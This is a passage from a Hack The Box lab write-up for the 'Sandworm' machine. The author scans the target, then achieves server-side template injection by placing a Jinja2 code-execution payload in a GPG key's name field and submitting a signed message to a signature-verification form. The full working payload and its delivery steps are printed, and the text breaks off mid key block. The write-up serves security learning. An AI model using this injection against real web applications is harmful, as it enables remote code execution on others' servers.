---
layout: post
title: Hack The Box Walkthrough - Sandworm
date: 2023-11-18
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/11/HTB/Sandworm
img: 2023/11/Sandworm/Sandworm.png
---

This was a fun box. I had to get code execution through [GPG](https://gnupg.org/) by injecting [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) in the name field of a key. Next I had to find a user's credentials, abuse a cron to get back to the first user I found. And finally exploit a vulnerability in [Firejail](https://firejail.wordpress.com/). The box was themed around the NSA, which added a nice twist.

* Room: Sandworm
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Sandworm](https://app.hackthebox.com/machines/Sandworm)
* Author: [C4rm3l0](https://app.hackthebox.com/users/458049)

## Enumeration

I ran Rustscan to detect any open ports on the machine.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.210.200:22
Open 10.129.210.200:80
Open 10.129.210.200:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-27 20:05 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed

...

Nmap scan report for target (10.129.210.200)
Host is up, received user-set (0.048s latency).
Scanned at 2023-08-27 20:05:39 EDT for 14s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/organizationalUnitName=SSA/emailAddress=atlas@ssa.htb/localityName=Classified
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/organizationalUnitName=SSA/emailAddress=atlas@ssa.htb/localityName=Classified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7:487e:f3e2:14a4:999e:f842:0141:59a1

...


|_-----END CERTIFICATE-----
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

There were three open ports.

* 22 (SSH)
* 80 (HTTP)
* 443 (HTTPS)

Both HTTP ports were redirecting to 'https://ssa.htb'. I added that domain to my hosts file and ran a scan for possible subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.ssa.htb" "http://ssa.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ssa.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================


Total time: 0
Processed Requests: 648201
Filtered Requests: 648201
Requests/sec.: 0
```

It did not find any. I also scanned for UDP ports without finding anything of interest.

```bash
$ sudo nmap -sU target -v -oN nmapUdp.txt --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 09:56 EDT
Initiating Ping Scan at 09:56
Scanning target (10.129.229.16) [4 ports]
Completed Ping Scan at 09:56, 0.09s elapsed (1 total hosts)
Initiating UDP Scan at 09:56
Scanning target (10.129.229.16) [1000 ports]
Completed UDP Scan at 09:56, 0.49s elapsed (1000 total ports)
Nmap scan report for target (10.129.229.16)
Host is up (0.066s latency).
Not shown: 997 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
515/udp   closed printer
1072/udp  closed cardax
28641/udp closed unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
           Raw packets sent: 2089 (98.548KB) | Rcvd: 4 (268B)
```

## Website

I opened a browser to look at the website.

![Website](/assets/images/2023/11/Sandworm/Website.png "Website")

It was the site for a spying agency. I looked around the site. The contact form allowed sending a PGP encrypted message.

![Contact Form](/assets/images/2023/11/Sandworm/ContactForm.png "Contact Form")

The guide page had a few forms to test encrypting, decrypting, and signing messages.

![Guides](/assets/images/2023/11/Sandworm/Guides.png "Guides")

There was also a public key that was provided to encrypt messages.

![Public Key](/assets/images/2023/11/Sandworm/PublicKey.png "Public Key")

I ran Feroxbuster to check for hidden pages.

```bash
$ feroxbuster -u https://ssa.htb -o ferox.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://ssa.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       83l      249w     4392c https://ssa.htb/login
302      GET        5l       22w      229c https://ssa.htb/logout => https://ssa.htb/login?next=%2Flogout
200      GET       69l      261w     3543c https://ssa.htb/contact
200      GET       77l      554w     5584c https://ssa.htb/about
200      GET       23l       44w      668c https://ssa.htb/static/scripts.js
302      GET        5l       22w      227c https://ssa.htb/admin => https://ssa.htb/login?next=%2Fadmin
200      GET        1l       10w    41992c https://ssa.htb/static/favicon.ico
200      GET        6l      374w    21258c https://ssa.htb/static/popper.min.js
200      GET      155l      691w     9043c https://ssa.htb/guide
200      GET     1346l     6662w    63667c https://ssa.htb/static/bootstrap-icons.css
200      GET        3l     1297w    89477c https://ssa.htb/static/jquery.min.js
200      GET        7l     1031w    78130c https://ssa.htb/static/bootstrap.bundle.min.js
200      GET     2019l    10020w    95610c https://ssa.htb/static/bootstrap-icons2.css
302      GET        5l       22w      225c https://ssa.htb/view => https://ssa.htb/login?next=%2Fview
200      GET    12292l    23040w   222220c https://ssa.htb/static/styles.css
200      GET      304l     1591w   115308c https://ssa.htb/static/eagl2.png
200      GET      124l      634w     8161c https://ssa.htb/
405      GET        5l       20w      153c https://ssa.htb/process
200      GET      155l      691w     9043c https://ssa.htb/guide/encrypt
200      GET       54l       61w     3187c https://ssa.htb/pgp
200      GET    10161l    60431w  4580604c https://ssa.htb/static/circleLogo2.png
200      GET      155l      691w     9043c https://ssa.htb/guide/verify
[####################] - 5m    119622/119622  0s      found:22      errors:0
[####################] - 5m    119601/119601  429/s   https://ssa.htb/
```

It found a login page. I tried SQL and NoSQL injections on it. Nothing worked, so I started looking at what I could do with the encryption functionalities.

The first thing I tried was the contact form. I created a simple payload with XXS and SSTI in it.

```html
<html>
<head></head>
<body>
</body>

{% raw %}{{ 7*7 }}{% raw %}

<img src="10.10.14.19/img" />
</html>
```

I know the basic commands for GPG, but I barely use them, so I looked for a tutorial. I found a [good one](https://www.digitalocean.com/community/tutorials/how-to-use-gpg-to-encrypt-and-sign-messages) from DigitalOcean.

I imported the public key that was provided, and used it to encrypt my payload.

```bash
$ gpg --import ssa.pub
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number processed: 1
gpg:               imported: 1

$ gpg --list-keys
/home/ehogue/.gnupg/pubring.kbx
-------------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

$ gpg --encrypt --armor -r atlas@ssa.htb test.html
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y

$ cat test.html.asc
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmAQ//bex3rMdInGGOJJvu/rsGmNG4lsG2NZsEPuo248LO3WXo
Gz0LPHaiywTZ3wGKReWBtarqepc/LNMXkq9pjr3H8dSyS8e+IPqbxo0N/1FvzZvY
Cri9BOvsHyHL2ZvcpMKEey+P5XmAmm/5BqANrUjmGFfoLq7wtuUsxskFeHnHwxsH
1TsmulzhGkgON8xJ0umq0AtXzHYJ+YnL8I/zjcPRs8jEe48R4T/QdkEwNPHnIAhZ
AN+stNPtM+7hlc/A+DzuXNSu2lAqNtF02WOHETewyCE2ypB6uRjVeoOxp2Njd0+1
kCLHA+4eNfyC74zkqKJwPcvkHvbYIsWrxl9Afs/EUzd8SVFU2Xyuk2kspj58g5wk
FKUTWj5JA9/c/pqZt9WP0DDnvNu21mP713SOgKiqFvvsPr31KSGub03LxXpxaeiN
SjXxGNATVOmZ9GzXM5ihnVXhcMfhKiSTVN+1lLHZni2B8FIls34rqUt+dtOdHW+N
RnTgre2VrPZ83x7SyjcWeE9ImL4Vkk7YWZafsTBz7U3pibHvtTqOP92ksCZqyJ2o
hJn/wE2S3wWmI1wEqfo786HYDyTbfnXLpnDFek+Se2EIivogOaz9tw9Ep5XPXlM6
uRqie/iPvGWbstTmW+nVMc4FMs6qYmOgBSDXUNKeHWaeqQ4ggb1YlBQHsCGfWFPS
hQFVNoKAu2XhR6TF5w8DpYdcm5jXpqmZkM6w+IBl0c9LB+BOnq6gvCMoQfCDMkXJ
pPrPYrutyNtYEZZUFaFmspWUp6esqPgX4IlP6ChNnTdyqiE6i5GIRl7YivtR9rBw
nyZTKAs65KKocu0ug2Hiox39aa4ah09h1jTXYNSLr00GXRQ//VU=
=rtcl
-----END PGP MESSAGE-----
```

I started a web server on my machine, and sent the message through the contact form. The message was not reflected back to me, so I did not know if the SSTI worked. I waited a little bit to see if an admin from the site would look at my message in a browser. I did not get any hit on my web server. I could have continued trying SSTI, but at this point I had no idea if a templating engine was used, which one it would be, and if the messages I sent were looked at by anyone. So I took a note and moved to the guide page.

The first form from the guide page took an encrypted message and decrypted it. I use the same payload that I build for the contact form and tried to decrypt it.

![Decrypt Message](/assets/images/2023/11/Sandworm/DecryptedPayload.png "Decrypt Message")

The decryption worked. My payload was displayed, but not executed.

The encryption form requested a public key. I could not control the message that was encrypted. I used the provided key, then use the decryption feature to look at the generated message.

```
This is an encrypted message for SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>.

If you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.

Congratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.

SSA: 09/03/2023-14;10;19
```

The last form of the page allowed verifying a signature. It required a public key, and a signed message to verify. I tried it with the provided key and the example signed message.

![Verified Signature](/assets/images/2023/11/Sandworm/VerifiedSignature.png "Verified Signature")

This opened a pop-up with the result of the signature verification. And some of the information displayed in the resulting HTML seemed to be coming from the public key. I could probably control some of it if I generated my own key.

I tested it by generating a key where the name would be a simple SSTI and XSS payload. The XSS was rejected because the name cannot contain `<` or `>`. I tried with only the SSTI.

```bash
$ gpg --full-generate-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection?
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (3072)
Requested keysize is 3072 bits
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: <img src="10.10.14.19/name" /> {% raw %}{{ 7 * 7 }}{% endraw %}
Invalid character in name
The characters '<' and '>' may not appear in name
Real name: {% raw %}{{ 7 * 7 }}{% endraw %}
Email address: {% raw %}{{ 7 * 7 }}{% endraw %}
Not a valid email address
Email address: test@test.com
Comment: aaa
You selected this USER-ID:
    "{% raw %}{{ 7 * 7 }}{% endraw %} (aaa) <test@test.com>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: directory '/home/ehogue/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/ehogue/.gnupg/openpgp-revocs.d/3FEDA77DD0FA82D9BE7BA048EE4A837D493C53BC.rev'
public and secret key created and signed.

pub   rsa3072 2023-09-02 [SC]
      3FEDA77DD0FA82D9BE7BA048EE4A837D493C53BC
uid                      {% raw %}{{ 7 * 7 }}{% endraw %} (aaa) <test@test.com>
sub   rsa3072 2023-09-02 [E]
```

I used the generated key to sign a message.

```bash
$ gpg --list-keys
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
/home/ehogue/.gnupg/pubring.kbx
-------------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa3072 2023-09-02 [SC]
      3FEDA77DD0FA82D9BE7BA048EE4A837D493C53BC
uid           [ultimate] {% raw %}{{ 7 * 7 }}{% endraw %} (aaa) <test@test.com>
sub   rsa3072 2023-09-02 [E]

$ gpg --output test.pub --armor --export test@test.com

$ cat test.pub
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
YSc/mQeyIjSb3bvlLJABD0OEHGTVDjc=
=n8bG
-----END PGP PUBLIC KEY BLOCK-----


$ gpg --sign --armor test.html

$ cat test.html.asc
-----BEGIN PGP MESSAGE-----

owGbwMvMwMX4zqu51tMmeA/jmtQkzpLU4hK9jJLcnJTP8k42IIYdl01GamKKnY0+
mOKyScpPqQRS+hCaq7pawVzLXKG2lovLJjM3XaG4KNlWydBAD4RM9Awt9YGCSgr6
IB0Q4zoZN7MwMHIxyIopsti/XV574VfTzX3VCzxg7mBlAtnNwMUpABM5nc3D8DTw
UlaToPKXU7k8HHszGhdLta+pixdKEu375vnev/Ls4cMrV0wR0jY8FenwoWVHpkoi
W+qSDROSrA9sX5C0T85sU5N4Z1xKT/xl003VNlrbtaWezlhyonhP5+z8C61vS56e
XzO779tm/7l7N/LEPNHbdL8wJqT5+ilztat71/58VSDIs3rn7Hqvdu0GU57WaWqT
FaacW1TPlNe287BOp9ehqP/fdR8xL1aLSH6hlhxcKLBt39QFz+c/6K//2yi/NMF0
0dI2meI7KenC4aybjlxwYZy8xeHV9R0qgct3vXlWf/TLqaatG1qm7Tl+5GJiU8U9
Z1Vd98h14cuO3j7P6B6suy1HtuKV3L3XD6Y+fM7RftlcbrLn1Fo+G4Xd3q3Oh3jc
gwsYA4MP3L2WziP45kK/7I6p7zjNHitOU6mYsHTiqntZra4C1ZG9ClNCJ1isd7py
YwXL12lOqdn7poRvncr7taB7wcdr/bUMM+P9+g9PP5DcdMDztuRJiT1fJl+Ynn1x
gc/R2QwZXfGer/LvVLNs+Jjy4iEA
=wKkQ
-----END PGP MESSAGE-----
```

I sent this to the verification form, my payload was executed.

![SSTI](/assets/images/2023/11/Sandworm/SSTI.png "SSTI")

I knew that I could be some code execution on the server, but I did not know which templating engine was used. I tried a few payloads from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). It looked like the server was using [Jinja2](https://palletsprojects.com/p/jinja/), but my payloads were crashing the server. I tried a [payload from a different site](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/).

```
{% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
```

I regenerated my GPG key with that payload as the name, signed a message, and pasted it to the form. It worked.

```bash
$ gpg --full-generate-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection?
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (3072)
Requested keysize is 3072 bits
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: {% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
Email address: test@test.com
Comment:
You selected this USER-ID:
    "{% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} <test@test.com>{% endraw %}"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/ehogue/.gnupg/openpgp-revocs.d/C303119ABE54DB87FB4922CCAD71986673962A25.rev'
public and secret key created and signed.

pub   rsa3072 2023-09-03 [SC]
      C303119ABE54DB87FB4922CCAD71986673962A25
uid                      {% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %} <test@test.com>
sub   rsa3072 2023-09-03 [E]

$ gpg  --armor --export test@test.com
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGT0oQABDACgGN7WIOlFXOnOZFw2mpVOfQigTmQ5kcX7CJFv6ahoLe6b/nHr
5M1EhN/UUOZhSTRuPn8WpxG8Yv/M28WebLtAqps2n/LbGWJk3iv1PzSScewBcPgl
RW6+RVHTUvT3+7KzdoXU6f788yNbSOLz5T/b1+d+skqClyalwqvZpIKKRr/msKwP
2NEjDgbzrMMg6O2mAkYq8kJ08YkF4TCUBBMXy1hvnoybRFWSJ0KyqBluZBmwnFxM
+3yjXjkfLtgEX0ZfYoR6cPAC8jUMk0Mx5HN8mFULwl7CcS45IM4HmIFIPLlqBzpf
7i6qzZooPKygtGRaxoOawqvO0v6m+P7bv6FL6s3IhgxMtck/8LLD4RfLEWouEUjQ
6v84OSu4MPyuOG089uUh+EFOBYLFICzHJzA7/5P0FSCD+z9gdToPaBXfHUnksNLm
u+8z8LZMOcnfPEI8o1q08m0HSvkxpsyjiWhjqtWgbZNa9UlhvaTHxJ37J/uIFa6x
N1oVI1aDHlz8hJMAEQEAAbRke3tyZXF1ZXN0LmFwcGxpY2F0aW9uLl9fZ2xvYmFs
c19fLl9fYnVpbHRpbnNfXy5fX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdpZCcpLnJl
YWQoKX19IDx0ZXN0QHRlc3QuY29tPokBzgQTAQoAOBYhBMMDEZq+VNuH+0kizK1x
mGZzliolBQJk9KEAAhsDBQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJEK1xmGZz
liolXUYL/2aIyFz7MuLxKVywAOQ+JTZ0U+IgO/T4MuYEq4ktLWdnbwTrLqcYabk/
k7/9SJ65IXdY+0dfeV/aepaq2LNQ6MMORv4ttoxeUprCj/5tLDY1gYJNxCAM0TYk
gHF5rZ1GokhOEpRCTYRQUUxvTm9Wr/UZDL60RPINstQZGAD860lFnDoWpN8+omzc
x55Sxn4B2DNOJkKUbiATki9mBvgDcKPIxRxVG/i0p5SQu0pZDnHJzYvQrz6WrLvA
9Z2GDwu4uvHu4w0FaCJ8RVuvlhIwrQIOaKGOHH5oI1R2u1aYVhML87N3IcDvDOhs
qVeUIPDmOGK5uIWe55ZJZn2p0lCAiUEHf6XHQvQL0XKJEKY9/CBqzy7gJEt67ukf
yNKVBWTFpvlaVWR5pQgq+oBhuWCLG3DIexP6OQwV0Phptr8dnCCOVUFKEP7XEC1c
eOmg3GT/iLrGp4o8m2SgrwYrOFi4GSownXsli7oZiRAJhVK7RIH4Yh6MNELs2gRb
h9H08ZCnlLkBjQRk9KEAAQwAoG3ekYyYn3ImmnobKCCtOWQlhaBP6mz7f8/6hbpG
gpSpApqIalBEUUP1tSKkVSFh+lS3KTH1fb4alY6QUszA7pThiKhKE+BMlII/Y477
JQNBzsGhq0in0Q5AKD5mW0kgxDRsSPz17ZXpwKEWE2q7Y7LfE9UqgKMn+PbJv3Ee
82mDmZzFO49DkjuZ2Rtt0OADIrXZloPjXJl42P9ay98c7PP5EejSPcio/ou3hyw8
Pb4w48vCsoHvv7ezv1WQGKekcZdW/54IwchOuBmf1NFuc+Dy9TqzJ/hZo+wOFlV1
Zz7d/knJPrMAUMJiBaZeQTUMc+hUqsEUMfOX1LhGFNI5jo5HehVSy+xtCeVhkSSZ
M/SbkSY6a3Op5M8YAHZbbox6UrmR/zCZaikDNkzAyqVIpy0hU5W4gNwPpUqZD/C1
7fjPvuuV+pfUhxNEFfe6MRiIs5ysa5tUcv3e/lro5jTNiZZ/O+k7okAyeLJx1NBG
VDXDzoJGJSVy5Z1LYRiIKse/ABEBAAGJAbYEGAEKACAWIQTDAxGavlTbh/tJIsyt
cZhmc5YqJQUCZPShAAIbDAAKCRCtcZhmc5YqJXoiDACMHLbLDipIZim1oXlMQ8N8
F6hZSNqw+RbKCOT3hPKdTdtO4lIdTxUMmiXvtizYw53rbLveyjPJz9BtWJFkhNVt
